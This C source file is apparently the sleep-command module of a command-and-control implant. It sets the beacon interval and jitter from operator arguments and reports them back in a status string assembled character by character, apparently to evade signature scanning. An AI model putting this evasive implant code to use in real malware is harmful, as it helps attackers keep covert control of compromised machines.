#include "config.h"
#ifdef INCLUDE_CMD_SLEEP

#include "commands.h"

VOID cmd_sleep(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD interval = parser_int32(args);
    DWORD jitter   = parser_int32(args);

    if (interval > 0) {
        inst->Config.sleep_ms = interval * 1000;
    }
    if (jitter <= 100) {
        inst->Config.jitter = jitter;
    }

    char msg[128] = {0};
    // "Sleep: Xs, J%"
    char* p = msg;
    *p++ = 'S'; *p++ = 'l'; *p++ = 'e'; *p++ = 'e'; *p++ = 'p';
    *p++ = ':'; *p++ = ' ';

    DWORD sec = inst->Config.sleep_ms / 1000;
    char tmp[16]; int ti = 0;
    if (sec == 0) { *p++ = '0'; }
    else {
        while (sec > 0) { tmp[ti++] = '0' + (sec % 10); sec /= 10; }
        for (int j = ti - 1; j >= 0; j--) *p++ = tmp[j];
    }
    *p++ = 's'; *p++ = ','; *p++ = ' ';

    ti = 0;
    DWORD j = inst->Config.jitter;
    if (j == 0) { *p++ = '0'; }
    else {
        while (j > 0) { tmp[ti++] = '0' + (j % 10); j /= 10; }
        for (int k = ti - 1; k >= 0; k--) *p++ = tmp[k];
    }
    *p++ = '%';

    package_add_string(inst, response, msg);
}

#endif
